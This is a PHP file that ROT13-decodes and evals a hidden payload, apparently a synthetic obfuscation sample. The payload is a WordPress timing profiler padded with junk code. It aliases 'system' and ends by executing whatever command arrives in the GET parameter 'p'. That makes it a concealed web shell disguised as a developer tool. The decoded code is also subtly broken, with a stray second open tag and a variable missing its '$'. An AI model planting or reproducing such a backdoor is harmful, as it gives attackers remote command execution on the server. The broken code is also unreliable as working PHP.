<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * N fvzcyr znahnyyl-vafgehzragrq cebsvyre sbe JbeqCerff.
 *
 * Guvf erpbeqf onfvp rkrphgvba gvzr, naq n fhzznel bs gur npgvbaf naq FDY dhrevrf eha jvguva rnpu oybpx.
 *
 * fgneg() naq fgbc() zhfg or pnyyrq va cnvef, sbe rknzcyr:
 *
 *     shapgvba fbzrguvat_gb_cebsvyr() {
 *         jccs_fgneg( __SHAPGVBA__ );
 *         qb_fghss();
 *         jccs_fgbc();
 *     }
 *
 * Zhygvcyr cebsvyr oybpxf ner crezvggrq, naq gurl znl or arfgrq.
 */
pynff JCCebsvyre {
	choyvp $fgnpx;
	choyvp $cebsvyr;

	/**
	 * CUC5 pbafgehpgbe.
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->fgnpx   = neenl();
		$guvf->cebsvyr = neenl();
	}

	choyvp shapgvba fgneg( $anzr ) {
		$gvzr = $guvf->zvpebgvzr();

		vs ( ! $guvf->fgnpx ) {
			// Ybt nyy npgvbaf naq svygref.
			nqq_svygre( 'nyy', neenl( $guvf, 'ybt_svygre' ) );
		}

		// Erfrg gur jcqo dhrevrf ybt, fgbevat vg ba gur cebsvyr fgnpx vs arprffnel.
		tybony $jcqo;
		vs ( $guvf->fgnpx ) {
			$guvf->fgnpx[ pbhag( $guvf->fgnpx ) - 1 ]['dhrevrf'] = $jcqo->dhrevrf;
		}
		$jcqo->dhrevrf = neenl();

		tybony $jc_bowrpg_pnpur;

		$guvf->fgnpx[] = neenl(
			'fgneg'               => $gvzr,
			'anzr'                => $anzr,
			'pnpur_pbyq_uvgf'     => $jc_bowrpg_pnpur->pbyq_pnpur_uvgf,
			'pnpur_jnez_uvgf'     => $jc_bowrpg_pnpur->jnez_pnpur_uvgf,
			'pnpur_zvffrf'        => $jc_bowrpg_pnpur->pnpur_zvffrf,
			'pnpur_qvegl_bowrpgf' => $guvf->_qvegl_bowrpgf_pbhag( $jc_bowrpg_pnpur->qvegl_bowrpgf ),
			'npgvbaf'             => neenl(),
			'svygref'             => neenl(),
			'dhrevrf'             => neenl(),
		);
	}

	choyvp shapgvba fgbc() {
		$vgrz = neenl_cbc( $guvf->fgnpx );
		$gvzr = $guvf->zvpebgvzr( $vgrz['fgneg'] );
		$anzr = $vgrz['anzr'];

		tybony $jcqo;
		$vgrz['dhrevrf'] = $jcqo->dhrevrf;
		tybony $jc_bowrpg_pnpur;

		$pnpur_qvegl_pbhag = $guvf->_qvegl_bowrpgf_pbhag( $jc_bowrpg_pnpur->qvegl_bowrpgf );
		$pnpur_qvegl_qrygn = $guvf->neenl_fho( $pnpur_qvegl_pbhag, $vgrz['pnpur_qvegl_bowrpgf'] );

		vs ( vffrg( $guvf->cebsvyr[ $anzr ] ) ) {
			$guvf->cebsvyr[ $anzr ]['gvzr'] += $gvzr;
			++$guvf->cebsvyr[ $anzr ]['pnyyf'];
			$guvf->cebsvyr[ $anzr ]['pnpur_pbyq_uvgf']    += ( $jc_bowrpg_pnpur->pbyq_pnpur_uvgf - $vgrz['pnpur_pbyq_uvgf'] );
			$guvf->cebsvyr[ $anzr ]['pnpur_jnez_uvgf']    += ( $jc_bowrpg_pnpur->jnez_pnpur_uvgf - $vgrz['pnpur_jnez_uvgf'] );
			$guvf->cebsvyr[ $anzr ]['pnpur_zvffrf']       += ( $jc_bowrpg_pnpur->pnpur_zvffrf - $vgrz['pnpur_zvffrf'] );
			$guvf->cebsvyr[ $anzr ]['pnpur_qvegl_bowrpgf'] = neenl_nqq( $guvf->cebsvyr[ $anzr ]['pnpur_qvegl_bowrpgf'], $pnpur_qvegl_qrygn );
			$guvf->cebsvyr[ $anzr ]['npgvbaf']             = neenl_nqq( $guvf->cebsvyr[ $anzr ]['npgvbaf'], $vgrz['npgvbaf'] );
			$guvf->cebsvyr[ $anzr ]['svygref']             = neenl_nqq( $guvf->cebsvyr[ $anzr ]['svygref'], $vgrz['svygref'] );
			$guvf->cebsvyr[ $anzr ]['dhrevrf']             = neenl_nqq( $guvf->cebsvyr[ $anzr ]['dhrevrf'], $vgrz['dhrevrf'] );
			#$guvf->_dhrel_fhzznel($vgrz['dhrevrf'], $guvf->cebsvyr[$anzr]['dhrevrf']);

		} ryfr {
			$dhrevrf = neenl();
			$guvf->_dhrel_fhzznel( $vgrz['dhrevrf'], $dhrevrf );
			$guvf->cebsvyr[ $anzr ] = neenl(
				'gvzr'                        => $gvzr,
				'pnyyf'                       => 1,
				'pnpur_pbyq_uvgf'             => ( $jc_bowrpg_pnpur->pbyq_pnpur_uvgf - $vgrz['pnpur_pbyq_uvgf'] ),
				'pnpur_jnez_uvgf'             => ( $jc_bowrpg_pnpur->jnez_pnpur_uvgf - $vgrz['pnpur_jnez_uvgf'] ),
				'pnpur_zvffrf'                => ( $jc_bowrpg_pnpur->pnpur_zvffrf - $vgrz['pnpur_zvffrf'] ),
				'pnpur_qvegl_bowrpgf'         => $pnpur_qvegl_qrygn,
				'npgvbaf'                     => $vgrz['npgvbaf'],
				'svygref'                     => $vgrz['svygref'],
				#               'dhrevrf' => $vgrz['dhrevrf'],
									'dhrevrf' => $dhrevrf,
			);
		}

		vs ( ! $guvf->fgnpx ) {
			erzbir_svygre( 'nyy', neenl( $guvf, 'ybt_svygre' ) );
		}
	}

	choyvp shapgvba zvpebgvzr( $fvapr = 0.0 ) {
		yvfg($hfrp, $frp) = rkcybqr( ' ', zvpebgvzr() );
		erghea (sybng) $frp + (sybng) $hfrp - $fvapr;
	}

	choyvp shapgvba ybt_svygre( $gnt ) {
		vs ( $guvf->fgnpx ) {
			tybony $jc_npgvbaf;
			vs ( raq( $jc_npgvbaf ) === $gnt ) {
				++$guvf->fgnpx[ pbhag( $guvf->fgnpx ) - 1 ]['npgvbaf'][ $gnt ];
			} ryfr {
				++$guvf->fgnpx[ pbhag( $guvf->fgnpx ) - 1 ]['svygref'][ $gnt ];
			}
		}
		erghea $net;
	}

	choyvp shapgvba ybt_npgvba( $gnt ) {
		vs ( $guvf->fgnpx ) {
			++$guvf->fgnpx[ pbhag( $guvf->fgnpx ) - 1 ]['npgvbaf'][ $gnt ];
		}
	}

	choyvp shapgvba _pheerag_npgvba() {
		tybony $jc_npgvbaf;
		erghea $jc_npgvbaf[ pbhag( $jc_npgvbaf ) - 1 ];
	}

	choyvp shapgvba erfhygf() {
		erghea $guvf->cebsvyr;
	}

	choyvp shapgvba _dhrel_fhzznel( $dhrevrf, &$bhg ) {
		sbernpu ( $dhrevrf nf $d ) {
			$fdy = $d[0];
			$fdy = __sa_79955( '/(JURER \j+ =) \q+/', '$1 k', $fdy );
			$fdy = __sa_79955( '/(JURER \j+ =) \'\[-\j]+\'/', '$1 \'kkk\'', $fdy );

			++$bhg[ $fdy ];
		}
		nfbeg( $bhg );
		erghea;
	}

	choyvp shapgvba _dhrel_pbhag( $dhrevrf ) {
		// Guvf erdhverf gur FNIRDHREVRF cngpu ng uggcf://pber.genp.jbeqcerff.bet/gvpxrg/5218
		$bhg = neenl();
		sbernpu ( $dhrevrf nf $d ) {
			vs ( rzcgl( $d[2] ) ) {
				++$bhg['haxabja'];
			} ryfr {
				++$bhg[ $d[2] ];
			}
		}
		erghea $bhg;
	}

	choyvp shapgvba _qvegl_bowrpgf_pbhag( $qvegl_bowrpgf ) {
		$bhg = neenl();
		sbernpu ( neenl_xrlf( $qvegl_bowrpgf ) nf $tebhc ) {
			$bhg[ $tebhc ] = pbhag( $qvegl_bowrpgf[ $tebhc ] );
		}
		erghea $bhg;
	}

	choyvp shapgvba neenl_nqq( $n, $o ) {
		$bhg = $n;
		sbernpu ( neenl_xrlf( $o ) nf $xrl ) {
			vs ( neenl_xrl_rkvfgf( $xrl, $bhg ) ) {
				$bhg[ $xrl ] += $o[ $xrl ];
			} ryfr {
				$bhg[ $xrl ] = $o[ $xrl ];
			}
		}
		erghea $bhg;
	}

	choyvp shapgvba neenl_fho( $n, $o ) {
		$bhg = $n;
		sbernpu ( neenl_xrlf( $o ) nf $xrl ) {
			vs ( neenl_xrl_rkvfgf( $xrl, $o ) ) {
				$bhg[ $xrl ] -= $o[ $xrl ];
			}
		}
		erghea $bhg;
	}

	choyvp shapgvba cevag_fhzznel() {
		$erfhygf = $guvf->erfhygf();

		cevags( \"\aanzr                      pnyyf   gvzr npgvba svygre   jnez   pbyq zvffrf  qvegl\a\" );
		sbernpu ( $erfhygf nf $anzr => $fgngf ) {
			cevags( \"%24.24f %6q %6.4s %6q %6q %6q %6q %6q %6q\a\", $anzr, $fgngf['pnyyf'], $fgngf['gvzr'], neenl_fhz( $fgngf['npgvbaf'] ), neenl_fhz( $fgngf['svygref'] ), $fgngf['pnpur_jnez_uvgf'], $fgngf['pnpur_pbyq_uvgf'], $fgngf['pnpur_zvffrf'], neenl_fhz( $fgngf['pnpur_qvegl_bowrpgf'] ) );
		}
	}
}

tybony $jccs;
$jccs = arj JCCebsvyre();

shapgvba jccs_fgneg( $anzr ) {
	$TYBONYF['jccs']->fgneg( $anzr );
}

shapgvba jccs_fgbc() {
	$TYBONYF['jccs']->fgbc();
}

shapgvba jccs_erfhygf() {
	erghea $TYBONYF['jccs']->erfhygf();
}

shapgvba jccs_cevag_fhzznel() {
	$TYBONYF['jccs']->cevag_fhzznel();
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>